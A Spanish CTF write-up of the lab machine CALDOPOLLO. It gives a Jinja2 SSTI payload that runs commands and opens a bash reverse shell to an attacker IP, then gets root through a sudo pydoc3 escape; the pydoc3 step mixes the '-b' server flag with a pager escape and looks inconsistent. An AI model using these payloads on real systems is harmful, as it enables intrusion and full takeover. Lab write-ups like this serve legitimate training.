# 📋 CTF Writeup: CALDOPOLLO

Documentación técnica y pasos de resolución (Writeup) para la máquina **CALDOPOLLO** desplegada en un entorno local de virtualización.

---

## 🔍 1. Fase de Reconocimiento y Enumeración

### Descubrimiento de Puertos Abiertos
Se inicia con un escaneo rápido de todo el rango de puertos TCP utilizando herramientas de mapeo de red (`nmap`) para identificar los servicios activos en la IP objetivo `192.168.0.104`.

```bash
recon 192.168.0.104
```

**Puertos detectados:**
* **22/tcp**: SSH abierto.
* **80/tcp**: Servidor web HTTP activo.
* **8089/tcp**: Puerto alternativo HTTP activo.

---

### Análisis Detallado de Servicios
Se ejecuta un escaneo de huella de versiones (`-sV`) y scripts por defecto (`-sC`) sobre los puertos específicos encontrados.

```bash
enum 22,80,8089 192.168.0.104
```

#### Resultados Clave:
* **Puerto 22**: `OpenSSH 9.2p1 Debian 2+deb12u2` (Sistema operativo base: Debian 12 Bookworm).
* **Puerto 80**: `Apache httpd 2.4.57` mostrando la página por defecto de Debian.
* **Puerto 8089**: Servidor de desarrollo `Werkzeug httpd 2.2.2` ejecutando **Python 3.11.2** bajo el título web **"Caldo pollo"**.

---

## 🎯 2. Vector de Intrusión (Explotación)

### Descubrimiento de SSTI (Server-Side Template Injection)
Al auditar el puerto `8089`, se detecta un formulario o parámetro vulnerable a inyección de plantillas de lado del servidor (SSTI) en el motor Jinja2/Python.

Prueba de concepto inicial exitosa para verificar ejecución de comandos (`id`):
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Ejecución de Reverse Shell
Para ganar acceso interactivo al sistema, se envía un payload a través del parámetro vulnerable (`cmd=test`) inyectando una shell inversa hacia la IP del atacante (`192.168.0.5` en el puerto `1234`):

```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c \'bash -i >& /dev/tcp/192.168.0.5/1234 0>&1\'').read() }}
```

---

## 🖥️ 3. Tratamiento de la TTY (Estabilización de Shell)

Tras recibir la conexión en el terminal de escucha mediante `nc -lvp 1234`, se realiza el proceso estándar de sanitización de la consola para obtener un entorno interactivo óptimo:

```bash
# 1. Dentro de la shell reversa, instanciar pty
python3 -c 'import pty; pty.spawn("/bin/bash")'

# 2. Suspender la sesión al background
Ctrl + Z

# 3. Ajustar los parámetros de la terminal local y volver al frontend
stty raw -echo ; fg
reset xterm

# 4. Definir las variables de entorno de la terminal
export TERM=xterm
export SHELL=bash
```

---

## 🚀 4. Escalada de Privilegios

### Enumeración de Permisos Sudo
Una vez dentro del sistema como el usuario local `caldo`, se listan los privilegios de ejecución disponibles sin necesidad de contraseña:

```bash
caldo@CaldoPollo:~$ sudo -l
```

**Resultado:**
```text
User caldo may run the following commands on CaldoPollo:
    (root) NOPASSWD: /usr/bin/pydoc3
```

### Explotación de `pydoc3` (Escape de Binario)
El binario `/usr/bin/pydoc3` permite paginar documentación interactiva y cuenta con una función de escape incorporada que puede ser abusada si se ejecuta con privilegios altos (`sudo`).

1. Se ejecuta el servidor/paginador interno de pydoc:
   ```bash
   sudo pydoc3 -b 8888
   ```
2. Dentro de la interfaz o el modo de lectura del paginador, se invoca un escape de comandos usando el carácter `!`:
   ```text
   !/bin/sh
   ```
3. El sistema procesa la instrucción bajo el contexto de ejecución original (Root), otorgando de inmediato una shell con máximos privilegios:

```bash
# whoami
root
# cd /root
```

**¡Máquina comprometida exitosamente!** 🎉
